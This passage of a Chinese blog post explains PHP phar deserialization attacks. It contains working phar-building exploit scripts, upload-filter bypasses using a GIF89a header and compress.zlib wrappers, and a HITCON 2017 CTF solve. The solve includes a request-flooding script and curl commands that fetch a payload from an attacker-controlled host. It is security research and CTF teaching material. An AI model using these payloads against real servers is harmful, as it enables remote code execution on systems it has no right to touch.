class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>并且，即使将文件名修改掉，用test.php测试发现仍然可以识别为phar，执行wakeup和destrcut。</p><p><img src="https://i.loli.net/2020/03/15/TJUuKnl4k78M5Fa.png"></p><p><img src="https://i.loli.net/2020/03/15/ADHFwBxkd9vV4QZ.png"></p><p>这样可以绕过大部分的上传waf。</p><h1 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>结合之前所说的，利用条件有三：</p><ol><li>phar文件可以上传到服务器</li><li>要有魔术方法作为“跳板”</li><li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等字符没有过滤。</li></ol><h2 id="先从一个简单的例子开始"><a href="#先从一个简单的例子开始" class="headerlink" title="先从一个简单的例子开始"></a>先从一个简单的例子开始</h2><p>这里用<a href="https://www.smi1e.top/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E6%8B%93%E5%B1%95/#i-7">Smi1e师傅</a>写的一个简单的例子：</p><p><code>upload_file.php</code>后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/gif&quot;</span>)&amp;&amp;(substr($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>))== <span class="string">&#x27;gif&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Upload: &quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Type: &quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Temp file: &quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">&quot;upload_file/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">echo</span> $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],</span><br><span class="line">      <span class="string">&quot;upload_file/&quot;</span> .$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="string">&quot;upload_file/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Invalid file,you can only upload gif&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>upload_file.html</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;localhost&#x2F;upload_file.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;Upload&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure><p>file_un.php存在<code>file_exists()</code>，并且存在<code>__destruct()</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename=$_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">&#x27;echo &quot;ok&quot;;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($filename);</span><br></pre></td></tr></table></figure><p>根据<code>file_un.php</code>写一个生成phar的php文件，在文件头加上<code>GIF89a</code>绕过gif，然后我们访问这个php文件后，生成了phar.phar，修改后缀为gif，上传到服务器，然后利用<code>file_exists</code>，使用<code>phar://</code>执行代码<br>构造poc.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&#x27;upload/poc.phar&#x27;</span>);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line">$phar -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">$object = <span class="keyword">new</span> AnyClass();</span><br><span class="line">$object -&gt; output= <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/15/IEAJsvpCFuLO2XR.png"></p><p><img src="https://i.loli.net/2020/03/15/gdZwsJoITkxi7MU.png"></p><h2 id="当年0解的HITCON2017-Baby-H-MasterPHP"><a href="#当年0解的HITCON2017-Baby-H-MasterPHP" class="headerlink" title="当年0解的HITCON2017 Baby^H MasterPHP"></a>当年0解的HITCON2017 Baby^H MasterPHP</h2><p>用一个<code>HITCON2017</code>的一道题，当时<code>php+phar</code>第一次结合出现，而且结合匿名函数的生成机制（这一点也很难）。参赛者多数搞错了方向，所以当时是0解，<a href="https://github.com/orangetw/My-CTF-Web-Challenges/tree/master/hitcon-ctf-2017/baby^h-master-php-2017">原题链接</a></p><p>题解转载自<a href="https://mochazz.github.io/2019/02/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bphar/#%E4%BE%8B%E9%A2%98%E4%BA%8C">mochazz</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $FLAG    = create_function(<span class="string">&quot;&quot;</span>, <span class="string">&#x27;die(`/read_flag`);&#x27;</span>); </span><br><span class="line">    $SECRET  = `/read_secret`; </span><br><span class="line">    $SANDBOX = <span class="string">&quot;/var/www/data/&quot;</span> . md5(<span class="string">&quot;orange&quot;</span> . $_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);  </span><br><span class="line">    @mkdir($SANDBOX); </span><br><span class="line">    @chdir($SANDBOX); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">&quot;session-data&quot;</span>])) &#123; </span><br><span class="line">        $data = serialize(<span class="keyword">new</span> User($SANDBOX)); </span><br><span class="line">        $hmac = hash_hmac(<span class="string">&quot;sha1&quot;</span>, $data, $SECRET); </span><br><span class="line">        setcookie(<span class="string">&quot;session-data&quot;</span>, sprintf(<span class="string">&quot;%s-----%s&quot;</span>, $data, $hmac)); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123; </span><br><span class="line">        <span class="keyword">public</span> $avatar; </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$path</span>) </span>&#123; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;avatar = $path; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123; </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">            $random = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>)); </span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;function my_function_$random() &#123;&quot;</span> </span><br><span class="line">                .<span class="string">&quot;  global \$FLAG; \$FLAG();&quot;</span> </span><br><span class="line">                .<span class="string">&quot;&#125;&quot;</span>); </span><br><span class="line">            $_GET[<span class="string">&quot;lucky&quot;</span>](); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check_session</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">global</span> $SECRET; </span><br><span class="line">        $data = $_COOKIE[<span class="string">&quot;session-data&quot;</span>]; </span><br><span class="line">        <span class="keyword">list</span>($data, $hmac) = explode(<span class="string">&quot;-----&quot;</span>, $data, <span class="number">2</span>); </span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac)) </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span> ( !hash_equals(hash_hmac(<span class="string">&quot;sha1&quot;</span>, $data, $SECRET), $hmac) ) </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye Bye&quot;</span>); </span><br><span class="line"></span><br><span class="line">        $data = unserialize($data); </span><br><span class="line">        <span class="keyword">if</span> ( !<span class="keyword">isset</span>($data-&gt;avatar) ) </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye Bye Bye&quot;</span>); </span><br><span class="line">        <span class="keyword">return</span> $data-&gt;avatar; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">$path</span>) </span>&#123; </span><br><span class="line">        $data = file_get_contents($_GET[<span class="string">&quot;url&quot;</span>] . <span class="string">&quot;/avatar.gif&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">&quot;GIF89a&quot;</span>) </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Fuck off&quot;</span>); </span><br><span class="line">        file_put_contents($path . <span class="string">&quot;/avatar.gif&quot;</span>, $data); </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Upload OK&quot;</span>); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params">$path</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> ( !file_exists($path . <span class="string">&quot;/avatar.gif&quot;</span>) ) </span><br><span class="line">            $path = <span class="string">&quot;/var/www/html&quot;</span>; </span><br><span class="line">        header(<span class="string">&quot;Content-Type: image/gif&quot;</span>); </span><br><span class="line">        <span class="keyword">die</span>(file_get_contents($path . <span class="string">&quot;/avatar.gif&quot;</span>)); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    $mode = $_GET[<span class="string">&quot;m&quot;</span>]; </span><br><span class="line">    <span class="keyword">if</span> ($mode == <span class="string">&quot;upload&quot;</span>) </span><br><span class="line">        upload(check_session()); </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ($mode == <span class="string">&quot;show&quot;</span>) </span><br><span class="line">        show(check_session()); </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure><p>题目的意思很明确，要我们利用 <strong>Admin</strong> 类的 <code>__destruct</code> 方法来获得 <strong>flag</strong> 。但是 <strong>第23行</strong> 的 <strong>$random</strong> 变量我们无法获得，这样也就无法获得 <strong>flag</strong> ，所以我们要通过匿名类的名字来调用 <strong>flag</strong> 生成函数。</p><p>我们可以看看 <strong>create_function</strong> 函数对应的内核源码。（ <strong>php-src/Zend/zend_builtin_functions.c:1901</strong> ）</p><p><img src="https://i.loli.net/2020/03/16/Ci3tUPAoe4Jjbd7.png"></p><p>可以看到匿名函数的名字类似于 <strong>\0lambda_%d</strong> ，其中 <strong>%d</strong> 为数字，取决于进程中匿名函数的个数，但是我们每访问一次题目，就会生成一个匿名函数，这样匿名函数的名字就不好控制。</p><p>这里，我们便要引入 <strong>apache-prefork</strong> 模型(默认模型)介绍（关于该模型的介绍，可以参考： <a href="http://blog.jobbole.com/91920/">Apache的三种MPM模式比较：prefork，worker，event</a> ）。当用户请求过大时，超过 <strong>apache</strong> 默认设定的阀值时，就会启动新的线程来处理请求，此时在新的线程中，匿名函数的名字又会从1开始递增，这样我们就容易猜测匿名函数的名字了。</p><p>接下来我们就来找反序列化的利用点，我们很快看到 <strong>第40行</strong> 反序列化了一个可控的 <strong>$data</strong> 变量，但是上一行有一个 <strong>hash_equals</strong> 函数进行了数据校验，而 <strong>$SECRET</strong> 的值不可知，这就没法利用这一反序列化点。</p><p>接着我们会看到 <strong>第46行</strong> 有一个上传 <strong>gif</strong> 文件功能，且 <strong>$data</strong> 变量可控。那么攻击思路就是，我们先通过将构造好的 <strong>phar</strong> 文件传到服务器上，再利用可控的 <strong>$_GET[“url”]</strong> 结合 <strong>phar</strong> 协议，进行反序列化。用于生成 <strong>phar</strong> 的代码如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// phar.readonly无法通过该语句进行设置: init_set(&quot;phar.readonly&quot;,0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123; </span><br><span class="line">    <span class="keyword">public</span> $avatar; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$path</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;avatar = <span class="string">&#x27;avatar.gif&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> Admin();</span><br><span class="line">$filename = <span class="string">&#x27;avatar.phar&#x27;</span>;</span><br><span class="line">file_exists($filename) ? unlink($filename) : <span class="literal">null</span>;</span><br><span class="line">$phar=<span class="keyword">new</span> Phar($filename);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;foo.txt&quot;</span>,<span class="string">&quot;bar&quot;</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将生成的 <strong>avatar.phar</strong> 放在自己的 <strong>VPS</strong> 上并重命名成 <strong>avatar.gif</strong> ，然后将文件上传到题目服务器上：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;题目IP&#x2F;index.php?m&#x3D;upload&amp;url&#x3D;http:&#x2F;&#x2F;VPS_IP&#x2F;</span><br></pre></td></tr></table></figure><p>接着，我们需要通过大量请求，使 <strong>apache</strong> 重新开启一个新的线程，然后访问如下 <strong>url</strong> 即可完成反序列化并获得 <strong>flag</strong> ：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;题目IP&#x2F;index.php?m&#x3D;upload&amp;url&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;data&#x2F;xxxx&#x2F;&amp;lucky&#x3D;%00lambda_1</span><br></pre></td></tr></table></figure><p>这里我们使用orange的<code>fork.py</code>生成大量请求：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: UTF-8</span></span><br><span class="line"><span class="comment"># Author: orange@chroot.org</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        HOST = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">        PORT = <span class="number">8000</span></span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((HOST, PORT))</span><br><span class="line">        s.sendall(<span class="string">&#x27;GET /avatar.gif HTTP/1.1\nHost: localhost\nConnection: Keep-Alive\n\n&#x27;</span>)</span><br><span class="line">        <span class="comment"># s.close()</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="number">8</span></span><br><span class="line">pool = ThreadPool( i )</span><br><span class="line">result = pool.map_async( run, range(i) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure><p><strong>下面给出 Orange 的解题过程</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># get a cookie</span></span><br><span class="line">$ curl http://host/ --cookie-jar cookie</span><br><span class="line"></span><br><span class="line"><span class="comment"># download .phar file from http://orange.tw/avatar.gif</span></span><br><span class="line">$ curl -b cookie <span class="string">&#x27;http://host/?m=upload&amp;url=http://orange.tw/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># force apache to fork new process</span></span><br><span class="line">$ python fork.py &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># get flag</span></span><br><span class="line">$ curl -b cookie <span class="string">&quot;http://host/?m=upload&amp;url=phar:///var/www/data/<span class="variable">$MD5_IP</span>/&amp;lucky=%00lambda_1&quot;</span></span><br></pre></td></tr></table></figure><h1 id="从源码角度来看phar反序列化的问题"><a href="#从源码角度来看phar反序列化的问题" class="headerlink" title="从源码角度来看phar反序列化的问题"></a>从源码角度来看phar反序列化的问题</h1><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>其实，在看到前文那么多文件操作函数都受到<code>phar</code>反序列化的影响，我们会自然的思考：为什么？</p><ol><li>很多的函数都受影响</li><li>还有部分文件操作函数未受影响（如basename,fputs等）</li></ol><p>zsx大佬在文章——<a href="https://blog.zsxsoft.com/post/38">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a> 回答了我们的疑问：因为受影响的函数都使用了同样的一个接口，而未受影响的函数是因为未使用该接口。这个接口就是——<code>wrapper</code> 。</p><h2 id="流封装协议（wrapper）"><a href="#流封装协议（wrapper）" class="headerlink" title="流封装协议（wrapper）"></a>流封装协议（wrapper）</h2><p><code>wrapper</code>就是指封装的php协议。因为流式数据的种类各异，而每种类型需要独特的协议，以便读写数据，我们称这些协议为流封装协议。例如，我们可以读写文件系统，可以通过 HTTP、HTTPS 或 SSH 与远程 Web 服务器通信，还可以打开并读写 ZIP、RAR 或 PHAR 压缩文件</p><p>虽然过程是一样的，但是读写文件系统中文件的方式与收发 HTTP 消息的方式有所不同，流封装协议的作用是使用通用的接口封装这种差异。</p><p>每个流都有一个协议和一个目标。指定协议和目标的方法是使用流标识符：<code>://</code>，其中 <code> 是流的封装协议，</code> 是流的数据源。</p><p>使用 <strong>stream_get_wrappers()</strong> 获取当前系统注册的全部 wrapper</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\DELL&gt;php -r <span class="string">&quot;var_dump(stream_get_wrappers());&quot;</span></span><br><span class="line">Command line code:1:</span><br><span class="line">array(10) &#123;</span><br><span class="line">  [0] =&gt;</span><br><span class="line">  string(3) <span class="string">&quot;php&quot;</span></span><br><span class="line">  [1] =&gt;</span><br><span class="line">  string(4) <span class="string">&quot;file&quot;</span></span><br><span class="line">  [2] =&gt;</span><br><span class="line">  string(4) <span class="string">&quot;glob&quot;</span></span><br><span class="line">  [3] =&gt;</span><br><span class="line">  string(4) <span class="string">&quot;data&quot;</span></span><br><span class="line">  [4] =&gt;</span><br><span class="line">  string(4) <span class="string">&quot;http&quot;</span></span><br><span class="line">  [5] =&gt;</span><br><span class="line">  string(3) <span class="string">&quot;ftp&quot;</span></span><br><span class="line">  [6] =&gt;</span><br><span class="line">  string(3) <span class="string">&quot;zip&quot;</span></span><br><span class="line">  [7] =&gt;</span><br><span class="line">  string(13) <span class="string">&quot;compress.zlib&quot;</span></span><br><span class="line">  [8] =&gt;</span><br><span class="line">  string(14) <span class="string">&quot;compress.bzip2&quot;</span></span><br><span class="line">  [9] =&gt;</span><br><span class="line">  string(4) <span class="string">&quot;phar&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="试着找问题的源头"><a href="#试着找问题的源头" class="headerlink" title="试着找问题的源头"></a>试着找问题的源头</h2><p>我们需要先找到其原理，然后往下深入挖掘。<br>先看<code>file_get_contents</code>的代码。其调用了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">stream = php_stream_open_wrapper_ex(filename, <span class="string">&quot;rb&quot;</span> ....);</span><br></pre></td></tr></table></figure><p>这么个函数。</p><p>再看<code>unlink</code>的代码，其调用了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">wrapper = php_stream_locate_url_wrapper(filename, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>这么个函数。</p><p>从<code>php_stream_open_wrapper_ex</code>的<a href="https://github.com/php/php-src/blob/8d3f8ca12a0b00f2a74a27424790222536235502/main/streams/streams.c#L2010">实现</a>，可以看到，其也调用了<code>php_stream_locate_url_wrapper</code> 。这个函数的作用是通过url来找到对应的wrapper。我们可以看到，phar组件注册了<code>phar://</code>这个wrapper， <a href="https://github.com/php/php-src/blob/67b4c3379a1c7f8a34522972c9cb3adf3776bc4a/ext/phar/stream.c">https://github.com/php/php-src/blob/67b4c3379a1c7f8a34522972c9cb3adf3776bc4a/ext/phar/stream.c</a><br>其定义如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> php_stream_wrapper_ops phar_stream_wops = &#123;</span><br><span class="line">    phar_wrapper_open_url,</span><br><span class="line">    <span class="literal">NULL</span>,                  <span class="comment">/* phar_wrapper_close */</span></span><br><span class="line">    <span class="literal">NULL</span>,                  <span class="comment">/* phar_wrapper_stat, */</span></span><br><span class="line">    phar_wrapper_stat,     <span class="comment">/* stat_url */</span></span><br><span class="line">    phar_wrapper_open_dir, <span class="comment">/* opendir */</span></span><br><span class="line">    <span class="string">&quot;phar&quot;</span>,</span><br><span class="line">    phar_wrapper_unlink,   <span class="comment">/* unlink */</span></span><br><span class="line">    phar_wrapper_rename,   <span class="comment">/* rename */</span></span><br><span class="line">    phar_wrapper_mkdir,    <span class="comment">/* create directory */</span></span><br><span class="line">    phar_wrapper_rmdir,    <span class="comment">/* remove directory */</span></span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接着，让我们翻这几个函数的实现，会发现它们都调用了<code>phar_parse_url</code>，这个函数再调用<code>phar_open_or_create_filename</code> -&gt; <code>phar_create_or_parse_filename</code> -&gt; <code>phar_open_from_fp</code> -&gt; <code>phar_parse_pharfile</code> -&gt; <code>phar_parse_metadata</code> -&gt; <code>phar_var_unserialize</code>。因此，明面上来看，所有文件函数，均可以触发此phar漏洞，因为它们都直接或间接地调用了这个wrapper。</p><h2 id="受影响的函数"><a href="#受影响的函数" class="headerlink" title="受影响的函数"></a>受影响的函数</h2><p>这是一个所有的和IO有关的函数，都可能触发的问题。操作文件的<code>touch</code>，也是能触发它的。而且我们会发现除了之前所说的文件操作函数，还有很多调用<code>wrapper</code>都可以触发：</p><h3 id="exif"><a href="#exif" class="headerlink" title="exif"></a>exif</h3><ul><li><code>exif_thumbnail</code></li><li><code>exif_imagetype</code></li></ul><h3 id="gd"><a href="#gd" class="headerlink" title="gd"></a>gd</h3><ul><li><code>imageloadfont</code></li><li><code>imagecreatefrom***</code></li></ul><h3 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h3><ul><li><code>hash_hmac_file</code></li><li><code>hash_file</code></li><li><code>hash_update_file</code></li><li><code>md5_file</code></li><li><code>sha1_file</code></li></ul><h3 id="file-url"><a href="#file-url" class="headerlink" title="file / url"></a>file / url</h3><ul><li><code>get_meta_tags</code></li><li><code>get_headers</code></li><li><code>touch</code></li></ul><h3 id="standard"><a href="#standard" class="headerlink" title="standard"></a>standard</h3><ul><li><code>getimagesize</code></li><li><code>getimagesizefromstring</code></li></ul><h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$zip = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">$res = $zip-&gt;open(<span class="string">&#x27;c.zip&#x27;</span>);</span><br><span class="line">$zip-&gt;extractTo(<span class="string">&#x27;phar://test.phar/test&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="Bzip-Gzip"><a href="#Bzip-Gzip" class="headerlink" title="Bzip / Gzip"></a>Bzip / Gzip</h3><p>如果题目限制了，<code>phar://</code>不能出现在头几个字符怎么办？</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$z &#x3D; &#39;compress.bzip2:&#x2F;&#x2F;phar:&#x2F;&#x2F;&#x2F;home&#x2F;sx&#x2F;test.phar&#x2F;test.txt&#39;;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__wakeup called&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$filename = <span class="string">&#x27;compress.zlib://phar://phar.phar/test.txt&#x27;</span>;</span><br><span class="line">file_get_contents($filename);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/16/QlPku3bO9DzyNmG.png"></p><p>这意味着我们能在 <code>compress.zlib://</code> 后面添加我们的 phar 语句，也就是说如果禁止了开头使用 <code>phar://</code> 我们就能用这种方法绕过。</p><h3 id="PDO-postgresql"><a href="#PDO-postgresql" class="headerlink" title="PDO::postgresql"></a><a href="https://github.com/php/php-src/blob/master/ext/pdo_pgsql/pgsql_driver.c#L674">PDO::postgresql</a></h3><p><img src="https://i.loli.net/2020/03/16/C3KAn8ipRueOkm2.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pdo = <span class="keyword">new</span> PDO(sprintf(<span class="string">&quot;pgsql:host=%s;dbname=%s;user=%s;password=%s&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;postgres&quot;</span>, <span class="string">&quot;sx&quot;</span>, <span class="string">&quot;123456&quot;</span>));</span><br><span class="line">@$pdo-&gt;pgsqlCopyFromFile(<span class="string">&#x27;aa&#x27;</span>, <span class="string">&#x27;phar://test.phar/aa&#x27;</span>);</span><br></pre></td></tr></table></figure><p>当然，<code>pgsqlCopyToFile</code>和<code>pg_trace</code>同样也是能使用的，只是它们需要开启phar的写功能。</p><h3 id="libxml"><a href="#libxml" 